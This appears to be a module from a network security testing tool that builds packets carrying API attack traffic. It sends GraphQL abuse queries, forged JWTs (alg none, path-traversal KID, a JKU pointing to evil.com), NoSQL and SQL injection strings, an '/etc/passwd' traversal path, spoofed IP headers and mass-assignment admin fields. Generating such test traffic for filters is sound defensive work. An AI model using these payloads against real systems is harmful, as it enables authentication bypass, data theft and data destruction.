"""API abuse traffic module."""

import random
from collections.abc import Iterator

from scapy.layers.inet import IP, TCP
from scapy.packet import Packet, Raw

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule

# GraphQL injection payloads
GRAPHQL_INJECTIONS = [
    # Introspection query (information disclosure)
    '{"query":"{ __schema { types { name } } }"}',
    # Nested query (DoS via complexity)
    '{"query":"{ users { friends { friends { friends { name } } } } }"}',
    # Batch query abuse
    '[{"query":"{ user(id:1) { name } }"},{"query":"{ user(id:2) { name } }"}]',
    # Directive abuse
    '{"query":"{ user @skip(if:false) @include(if:true) { name } }"}',
    # Field suggestion exploitation
    '{"query":"{ usre { name } }"}',  # Typo to trigger suggestions
]

# JWT manipulation patterns
JWT_ATTACKS = [
    # Algorithm none attack
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.",
    # Algorithm confusion (RS256 to HS256)
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.FAKE_SIG",
    # Expired token
    "eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MDAwMDAwMDAsInN1YiI6InVzZXIifQ.FAKE",
    # KID injection
    "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uL3Bhc3N3ZCJ9.eyJzdWIiOiIxIn0.FAKE",
    # JKU/X5U injection
    "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9ldmlsLmNvbS9qd2tzIn0.eyJzdWIiOiIxIn0.FAKE",
]


class APIAbuseModule(TrafficModule):
    """Traffic module for API abuse patterns.

    Generates HTTP requests that simulate REST/GraphQL API attacks,
    JWT manipulation, and rate limit bypass attempts.
    """

    def __init__(self) -> None:
        """Initialize the API abuse module."""
        self._attack_count = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="api_abuse",
            description="API attacks (GraphQL injection, JWT manipulation, rate limit bypass)",
            category=TrafficCategory.WEB_FILTER,
            protocols=["TCP"],
            ports=[80, 443, 8080, 3000],
        )

    def _generate_graphql_injection(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate GraphQL injection attacks."""
        payload = random.choice(GRAPHQL_INJECTIONS)

        http_request = (
            f"POST /graphql HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
            f"{payload}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_jwt_attack(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate JWT manipulation attacks."""
        token = random.choice(JWT_ATTACKS)

        http_request = (
            f"GET /api/admin HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Authorization: Bearer {token}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_rate_limit_bypass(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate rate limit bypass attempts."""
        # Headers commonly used to bypass rate limits
        bypass_headers = [
            "X-Forwarded-For: 127.0.0.1",
            "X-Real-IP: 10.0.0.1",
            "X-Originating-IP: 192.168.1.1",
            "X-Client-IP: 172.16.0.1",
            "True-Client-IP: 8.8.8.8",
            "X-Forwarded-Host: localhost",
            "X-Remote-IP: 1.2.3.4",
            "X-Remote-Addr: 5.6.7.8",
        ]

        header = random.choice(bypass_headers)
        ip_value = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        header = header.rsplit(":", 1)[0] + f": {ip_value}"

        http_request = (
            f"GET /api/resource HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"{header}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_rest_injection(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate REST API injection patterns."""
        # NoSQL injection patterns
        nosql_payloads = [
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            '{"$where": "this.password.match(/.*/)"}',
            '{"username": {"$regex": "admin.*"}}',
            '{"$or": [{"username": "admin"}, {"admin": true}]}',
        ]

        payload = random.choice(nosql_payloads)

        http_request = (
            f"POST /api/login HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
            f"{payload}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_idor_pattern(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate Insecure Direct Object Reference patterns."""
        # IDOR attempts via ID manipulation
        paths = [
            "/api/users/1",
            "/api/users/0",
            "/api/users/-1",
            "/api/documents/../../etc/passwd",
            "/api/account/999999",
            "/api/orders/1; DROP TABLE orders--",
        ]

        path = random.choice(paths)

        http_request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Authorization: Bearer eyJ...\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_mass_assignment(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate mass assignment attack patterns."""
        # Attempt to modify protected fields
        payloads = [
            '{"username": "user", "isAdmin": true}',
            '{"email": "test@test.com", "role": "admin"}',
            '{"name": "test", "credits": 99999}',
            '{"user": {"id": 1, "admin": true}}',
        ]

        payload = random.choice(payloads)

        http_request = (
            f"PUT /api/users/profile HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
            f"{payload}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_api_version_abuse(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate API version abuse patterns."""
        # Accessing old/deprecated API versions
        old_versions = [
            "/api/v1/admin/users",
            "/api/v0/internal/config",
            "/v1/debug/pprof",
            "/api/legacy/auth",
            "/api/beta/secrets",
        ]

        path = random.choice(old_versions)

        http_request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate API abuse packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port

        Yields:
            Scapy packets with API abuse patterns
        """
        port = dst_port or 80
        self._attack_count += 1

        # Rotate through different attack types
        attack_type = self._attack_count % 7

        if attack_type == 0:
            yield from self._generate_graphql_injection(src_ip, dst_ip, port)
        elif attack_type == 1:
            yield from self._generate_jwt_attack(src_ip, dst_ip, port)
        elif attack_type == 2:
            yield from self._generate_rate_limit_bypass(src_ip, dst_ip, port)
        elif attack_type == 3:
            yield from self._generate_rest_injection(src_ip, dst_ip, port)
        elif attack_type == 4:
            yield from self._generate_idor_pattern(src_ip, dst_ip, port)
        elif attack_type == 5:
            yield from self._generate_mass_assignment(src_ip, dst_ip, port)
        else:
            yield from self._generate_api_version_abuse(src_ip, dst_ip, port)

